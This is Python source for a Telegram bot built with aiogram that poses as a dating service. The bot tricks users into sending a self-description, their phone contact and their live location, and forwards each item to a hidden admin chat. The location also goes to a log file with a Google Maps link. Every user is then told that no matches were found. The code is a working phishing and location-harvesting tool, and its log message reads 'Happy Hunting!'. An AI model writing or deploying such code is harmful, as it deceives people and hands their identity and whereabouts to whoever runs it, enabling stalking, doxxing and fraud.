import logging
import asyncio
import os
import importlib.util
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import ParseMode

# Set the logging level
logging.basicConfig(level=logging.INFO)

# Define the path to config.py
config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '..', 'config.py')

# Load the configuration
spec = importlib.util.spec_from_file_location("config", config_path)
config = importlib.util.module_from_spec(spec)
spec.loader.exec_module(config)

API_TOKEN = config.TOKEN
ADMIN_CHAT_ID = config.CHATID

# Initialize the bot and dispatcher
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

# Function to send a startup message
async def send_startup_message():
    await bot.send_message(chat_id=ADMIN_CHAT_ID, text="~ Bot has been started!")
    logging.info("[!] Bot has been Started!\n [+] Happy Hunting! :D")

# Handler for the /start command
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    await message.answer(f'''👋 Hello! {message.from_user.first_name}👋
    This is a dating bot!
    To start, enter /search''')

# Handler for the /search command
@dp.message_handler(commands=['search'])
async def search(message: types.Message):
    msg = await message.answer('To start, write a little about yourself (in one message)')
    await proc2(msg)

# Function to process user messages
async def proc2(message: types.Message):
    try:
        num = message.text
        await bot.send_message(ADMIN_CHAT_ID, f'Received information: {num}')
        logging.info(num)
        await asyncio.sleep(2)
        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        button_phone = types.KeyboardButton(text="Register", request_contact=True)
        keyboard.add(button_phone)
        await message.answer('''To use the bot, please register!''', reply_markup=keyboard)
    except Exception as e:
        logging.exception(e)
        await message.answer('An unidentified error occurred, please restart the bot!')

# Handler for contact information
@dp.message_handler(content_types=['contact'])
async def contact(message: types.Message):
    if message.contact:
        nick = message.from_user.username
        first = message.contact.first_name
        last = message.contact.last_name
        userid = message.contact.user_id
        phone = message.contact.phone_number
        await message.answer("Registration was successful!")
        info = f'''
    Data
    ├Name: {first} {last}
    ├ID: {userid}
    ├Username: @{nick}
    └Phone number: {phone}
            '''
        await bot.send_message(ADMIN_CHAT_ID, info)
        logging.info(info)

        if userid != message.chat.id:
            await message.answer('Send your contact!')
        await asyncio.sleep(1)
        keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        button_location = types.KeyboardButton(text="Send", request_location=True)
        keyboard1.add(button_location)
        await message.answer(text='Send your location so the bot can find nearby users!', reply_markup=keyboard1)

# Handler for location information
@dp.message_handler(content_types=['location'])
async def location(message: types.Message):
    if message.location:
        lon = str(message.location.longitude)
        lat = str(message.location.latitude)
        geo = f'''
        Geolocation
        ├ID: {message.chat.id}
        ├Longitude: {lon}
        ├Latitude: {lat} 
        └Maps: https://www.google.com/maps/place/{lat}+{lon} 
        '''
        with open('bot-log.txt', 'a+', encoding='utf-8') as log:
            log.write(geo + '  ')
        await bot.send_message(ADMIN_CHAT_ID, geo)
        logging.info(geo)
        await message.answer('Searching...')
        await asyncio.sleep(2)
        await message.answer('Unfortunately, no suitable users were found in the database!')

# Start the bot
async def main():
    await send_startup_message()
    logging.info("Starting the bot...")
    await dp.start_polling()

if __name__ == '__main__':
    asyncio.run(main())
